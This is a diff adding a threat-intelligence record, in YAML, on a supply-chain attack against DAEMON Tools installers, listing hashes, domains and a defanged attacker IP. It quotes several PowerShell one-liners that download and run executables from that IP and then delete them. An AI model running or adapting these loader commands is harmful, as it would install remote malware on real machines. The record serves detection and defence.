@@ -1,0 +1,69 @@
+title: DAEMON Tools Software Supply Chain Attack
+description: DAEMON Tools software installers were compromised with a malicious payload,
+  affecting thousands of machines across multiple countries.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  command_lines:
+  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/<hexadecimal
+    string>','C:\Windows\Temp\<filename>.exe')" && %TEMP%\ <filename> <arguments>
+    && del %TEMP%\ <filename>.exe
+  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/env_check_script','C:\Windows\Temp\envchk.exe')"
+    && C:\Windows\Temp\envchk.exe http://38.180.107[.]76/09505aca4f538bd&&del %TEMP%\envchk.exe
+  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/b3593ac2edb34f4d4d','C:\Windows\Temp\cdg.exe')"
+    && powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/368b1365bd9176b359','%TEMP%\cdg.tmp')"
+    && %TEMP%\cdg.exe schedsvc.dll %TEMP%\cdg.tmp first_match&&del %TEMP%\cdg.exe&&del
+    %TEMP%\cdg.tmp
+  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/407fbb423143f99fe0','C:\ProgramData\Microsoft\mcrypto.chiper')"&&powershell
+    -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/07fbb423143f99fe07','$appdata\Microsoft\mcrypto.dat')"&&start
+    rundll32.exe $appdata\Microsoft\mcrypto.chiper, mcrypto_clean
+  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/407fbb423143f99fe0','C:\Windows\Temp\crypto.dll')"&&powershell
+    -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/07fbb423143f99fe07','$appdata\Microsoft\mcrypto.dat')"&&start
+    rundll32.exe %TEMP%\rypto.dll, mcrypto_clean
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads:
+  - schedsvc.dll
+  - msquic.dll
+  network_connections:
+  - cmd.exe -> env-check.daemontools[.]cc:80
+  - cdg.exe -> 38.180.107[.]76:80
+  - envchk.exe -> 38.180.107[.]76:80
+  - mcrypto.chiper -> 38.180.107[.]76:80
+  - crypto.dll -> 38.180.107[.]76:80
+  file_activity:
+  - C:\Windows\Temp\<filename>.exe
+  - C:\Windows\Temp\envchk.exe
+  - C:\Windows\Temp\cdg.exe
+  - C:\Windows\Temp\cdg.tmp
+  - C:\ProgramData\Microsoft\mcrypto.chiper
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - 2d4eb55b01f59c62c6de9aacba9b47267d398fe4
+  - a3e90653bd0a81ebe2ae387a67a59bb8d07ce7b5
+  - 3ee71d75020b2634b2c23866211a0c91b942c8d4
+  - 9dbfc23ebf36b3c0b56d2f93116abb32656c42e4
+  - 2ecb292d27c36c1d4e47fb5cafa42af7ffbdda99
+  - 98de8147394b74b27158e02ce9e7b0e25eb6e98a
+  ip_addresses:
+  - 38.180.107[.]76
+  domains:
+  - env-check.daemontools[.]cc
+  - daemon-tools[.]cc
+  urls:
+  - hxxps://env-check.daemontools[.]cc/2032716822411?s=<full computer name>
+authors: 
+- Igor Kuznetsov
+- Georgy Kucherin
+- Leonid Bezvershenko
+- Anton Kargin
+reference: https://securelist.com/tr/daemon-tools-backdoor/119654/#comment-3581649
+date_of_publication: May 05, 2026
+file_creation_date: May 09, 2026
